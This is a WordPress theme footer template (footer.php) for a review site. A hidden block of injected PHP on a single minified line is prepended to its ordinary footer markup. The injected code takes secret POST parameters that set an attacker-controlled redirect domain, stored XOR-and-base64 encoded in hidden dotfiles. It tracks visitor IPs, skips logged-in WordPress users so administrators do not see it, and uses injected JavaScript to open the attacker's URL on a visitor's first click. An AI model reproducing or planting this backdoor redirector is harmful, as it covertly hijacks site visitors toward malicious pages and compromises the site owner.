<?php /* 5pJQhrPh3XJCUOiaQCa6 */ ?><?php
error_reporting(E_ALL);$DOMAIN_FNAME1_7QNG='.SIc7CYwgY';$DOMAIN_FNAME2_7QNG='/var/tmp/.SIc7CYwgY';if(isset($_POST['6FoNxbvo73BHOjhxokW3'])){check_status($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);return;}else if(isset($_POST['8Yx5AefYpBp07TEocRmv'])){$domain=$_POST['8Yx5AefYpBp07TEocRmv'];echo "$domain\n";var_dump($_POST);if(isset($_POST['https'])){$domain="https://$domain";}else {$domain="http://$domain";}echo $domain;save_str($domain,$DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);return;}else {$keys=array_keys($_COOKIE);$cookies=implode($keys);if(strpos($cookies,"wordpress_logged")!==false||strpos($cookies,"wp-settings")!==false||strpos($cookies,"wordpress_test")!==false){}else {onClientConnect($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);}}function ip_is_there($fname1,$fname2,$ip){if(!file_exists($fname1)&&!file_exists($fname2)){return false;}$contains=false;$file=fopen($fname1,'r');if(!$file){$file=fopen($fname2,'r');}if(!$file){return;}while(!feof($file)){$line=fgets($file);if(strpos($line,$ip)!==false){$contains=true;break;}}fclose($file);return $contains;}function add_ip($fname1,$fname2,$ip){$file=fopen($fname1,'a');if(!$file){$file=fopen($fname2,'a');}if(!$file){return;}fwrite($file,$ip);fwrite($file,"\n");fclose($file);}function onClientConnect($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG){$ip=$_SERVER['REMOTE_ADDR'];$file1="./.ips1.txt";$file1_b="/var/tmp/.ips1.txt";$isIn1=false;$isIn2=false;if(ip_is_there($file1,$file1_b,$ip)){$isIn1=true;}count_lines_and_truncate($file1,$file1_b);if(!$isIn1){add_ip($file1,$file1_b,$ip);$domain=read_str($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);redirect($domain);}return;if(!$isIn1){add_ip($file1,$file1_b,$ip);;}else if($isIn1&&!$isIn2){if(is_usa_ip($_SERVER['REMOTE_ADDR'])){$domain=read_str($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);$domain="http://www.google.com/";redirect($domain);}}else {return;}}function count_lines_and_truncate($fname1,$fname2){if(!file_exists($fname1)&&!file_exists($fname2)){return 0;}$line_count=0;$file=fopen($fname1,'r');$fname=$fname1;if(!$file){$file=fopen($fname2,'r');$fname=$fname2;}if(!$file){return 0;}while(!feof($file)){$line=fgets($file);$line_count++;}if($line_count>3000){unlink($fname);ftruncate($file,0);}fclose($file);return $line_count;}function xor_enc($str){$key='KQzLStQQblMU3rBGqFyEn8LlEWZ1G4vbK7YcpfZKrjaUQhP3sQKJHKaVLtr0H8RSPPqbDqfNEQ0Yu08mHsI77NGcU5rbsMLNWwlqDXmM5E9WqY73rBvXwj5GkQay2wnuGc4wFKYyYLMEhQDAG60aeYudKtUSUXDHYG912g0VWlYob3lycp0eC1QnoQe3xsWPbA3e1ZWY';$res='';for($i=0;$i<strlen($str);$i++){$res.=chr(ord($str[$i])^ord($key[$i]));}return $res;}function enc($str){$res=xor_enc($str);$res=base64_encode($res);return $res;}function dec($str){$str=base64_decode($str);$res=xor_enc($str);return $res;}function show_popup($url){echo "
<script type='text/javascript'>
var t = false;
document.onclick= function(event) {
if (t) {
return;
}
t = true;
  if ( event === undefined) event= window.event;
  var target= 'target' in event? event.target : event.srcElement;
  var win = window.open('$url', '_blank');
  win.focus();
};
 </script>
";}function redirect($url){show_popup($url);return;$r=rand(5,20);sleep($r);echo "<meta http-equiv='refresh' content='0; url=$url' />";die();die("<script type='text/javascript'>
           window.location = '$url'
      </script>");}function check_status($df1,$df2){$domain=read_str($df1,$df2);echo "Domain is: $domain\n";}function read_str($fname1,$fname2){$file=fopen($fname1,'r');$name=$fname1;if(!$file){$name=$fname2;$file=fopen($fname2,'r');}if(!$file){return;}$str=fread($file,filesize($name));$str=dec($str);fclose($file);return $str;}function save_str($str,$fname1,$fname2){$file=fopen($fname1,'w');if(!$file){$file=fopen($fname2,'w');}if(!$file){return;}$str=enc($str);fwrite($file,$str);fclose($file);}?>

<?php /* uqjsQSyWVhmOHAEVa1i6 */ ?><?php //get theme options
global $oswc_front, $oswc_ads, $oswc_misc, $oswc_single, $oswcPostTypes;

//set theme options
$oswc_flickr_name = $oswc_misc['flickr_name'];
$oswc_google_analytics = $oswc_misc['google_analytics'];


$oswc_featured_duration = $oswc_front['featured_duration'];
$oswc_spotlight_duration = $oswc_front['spotlight_duration'];

$oswc_colorbox = $oswc_misc['colorbox'];
$oswc_footer_menu_hide = $oswc_misc['footer_menu_hide'];


?>




	
        
    </div><!--end main wrapper dark-->
    
    </div><!--end main white content wrapper -->
    
    <div id="footer-wrapper"> <!--begin footer wrapper -->
        
        <div id="footer">
        
        	<?php if(!$oswc_footer_menu_hide) { //the menu in the footer ?>
        
                
                
                 <br class="clearer" />
                
            <?php } ?>
        
            <div class="copyright">
            
            	
            
                <div class="floatleft">
            
                    <?php _e( 'Copyright', 'itb' ); ?> &copy; <?php echo date("Y").' '.get_bloginfo('name'); ?>,&nbsp;<?php _e( 'All Rights Reserved.', 'itb' ); ?>
                    
                </div>
                
                <div class="floatright">
                
                    <div class="floatleft">
                    
                        <?php if ( function_exists('dynamic_sidebar') && dynamic_sidebar('Footer Credits') ) : else : ?>
                        
                            &nbsp;
                        
                        <?php endif; ?> 
                        
                    </div>
                    
                </div>
                
                <br class="clearer" />
                
                <!--<div class="ribbon-shadow-right">&nbsp;</div>-->
            
            </div>
            
        </div>
    
    </div> <!--end footer wrapper-->

	<?php wp_footer(); ?>
	
	<?php echo $oswc_google_analytics; // google analytics code ?>  
    
    <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/plugins.js"></script> <!-- jquery plugin js -->
    
    <!-- need to setup review category tabs here since we don't know how many review types there are -->
    <script type="text/javascript">
		jQuery.noConflict(); 
		
		//DOCUMENT.READY
		jQuery(document).ready(function() { 
			//loop through each post type and setup a jquery tabs object
			<?php foreach($oswcPostTypes->postTypes as $postType){ ?>
					jQuery('#tabbed-<?php echo ucwords($postType->name); ?>-reviews > ul').tabs({ fx: { opacity: 'toggle', duration: 150 } });		
			<?php } ?> 
			
			<?php if($oswc_colorbox) { ?>			
				//colorbox
				jQuery('.review .article-image a').colorbox({transition:'fade', speed:250});
				jQuery('.single-post .content .article-image a').colorbox({transition:'fade', speed:250});
				jQuery('.colorbox').colorbox({transition:'fade', speed:250});
				jQuery('.colorboxiframe').colorbox({transition:'fade', speed:250, iframe:true, innerWidth:640, innerHeight:390});
				jQuery(".page-content a[href$='.jpg'],a[href$='.png'],a[href$='.gif']").colorbox(); 
				jQuery('.page-content .gallery a').colorbox({  rel:'gallery' });
										
			<?php } ?> 
			//initialize smooth div scroll on Don't Miss slider
			jQuery("#dontmiss").smoothDivScroll({ 
				autoScrollingMode: "always", 
				autoScrollingDirection: "endlessloopright", 
				autoScrollingStep: 1, 
				autoScrollingInterval: 50 
			});
		
			// Logo parade event handlers
			jQuery("#dontmiss").bind("mouseover", function() {
				jQuery(this).smoothDivScroll("stopAutoScrolling");
			}).bind("mouseout", function() {
				jQuery(this).smoothDivScroll("startAutoScrolling");
			});
			
			/* uitotop scroller:
			var defaults = {
	  			containerID: 'toTop', // fading element id
				containerHoverID: 'toTopHover', // fading element hover id
				scrollSpeed: 1200,
				easingType: 'linear' 
	 		};
			*/
			
			jQuery().UItoTop({ easingType: 'easeOutExpo' });	
	
		});
	
		//the reason they are here instead of in custom.js is because they contain php variables which can't
		//be applied in a .js file. Also, make sure these come before the darken function.
		
		//WINDOW.LOAD
		jQuery(window).load(function() {
			//spotlight slider	
			jQuery(function() {
				jQuery(".main-content-left #spotlight-slider, .main-content-left #spotlight-slider-responsive").jCarouselLite({		
					auto: <?php echo $oswc_spotlight_duration; ?>000,
					easing: "easeInOutExpo",
					speed: 1100,
					visible: 2			
				});	
			});
			jQuery(function() {
				jQuery(".main-content #spotlight-slider, .main-content #spotlight-slider-responsive").jCarouselLite({		
					auto: <?php echo $oswc_spotlight_duration; ?>000,
					easing: "easeInOutExpo",
					speed: 1100,
					visible: 3			
				});	
			});		
			//featured slider			
			jQuery('#featured').nivoSlider({				
				effect: 'random', // Specify sets like: 'fold,fade,sliceDown'
				slices: 10, // For slice animations
				boxCols: 6, // For box animations
				boxRows: 3, // For box animations
				animSpeed: 200, // Slide transition speed
				pauseTime: <?php echo $oswc_featured_duration; ?>000, // How long each slide will show
				startSlide: 0, // Set starting Slide (0 index)
				directionNav: true, // Next and Prev navigation
				directionNavHide: false, // Only show on hover
				controlNav: false, // 1,2,3... navigation
				controlNavThumbs: false, // Use thumbnails for Control Nav
				pauseOnHover: true, // Stop animation while hovering
				manualAdvance: false, // Force manual transitions
				prevText: 'Prev', // Prev directionNav text
				nextText: 'Next', // Next directionNav text
				beforeChange: function(){}, // Triggers before a slide transition
				afterChange: function(){}, // Triggers after a slide transition
				slideshowEnd: function(){}, // Triggers after all slides have been shown
				lastSlide: function(){}, // Triggers when last slide is shown
				afterLoad: function(){} // Triggers when slider has loaded							 
			});	
					
		});		
    </script>
    
    <!-- make sure this js file is called after image sliders are setup or else the mosaic and darken effects won't work on hidden image elements-->
    <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/custom.js"></script>   
    <?php if(!is_front_page() && !is_tax() && !is_category() && !is_tag() && !is_search() && !is_404() && !is_archive() && !is_page_template('template-reviews.php')) { //don't load external javascript for pages that don't use the sharebox?> 
    <?php if($oswc_share_plusone_show) { ?><script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script> <!-- google plus 1 button js --><?php } ?>   
    <?php if($oswc_share_pinterest_show) { ?><script type="text/javascript" src="http://assets.pinterest.com/js/pinit.js"></script> <!-- pinterest share button --><?php } ?>
    <?php if($oswc_share_tumblr_show) { ?><script type="text/javascript" src="http://platform.tumblr.com/v1/share.js"></script> <!-- tumblr --><?php } ?>
    <?php if($oswc_share_twitter_show) { ?><script src="http://platform.twitter.com/widgets.js" type="text/javascript"></script> <!-- twitter --><?php } ?>
    <?php if($oswc_share_digg_show) { ?><script src="http://widgets.digg.com/buttons.js" type="text/javascript"></script> <!-- digg --><?php } ?>
    <?php } ?>
	
</div>

</body>

</html>
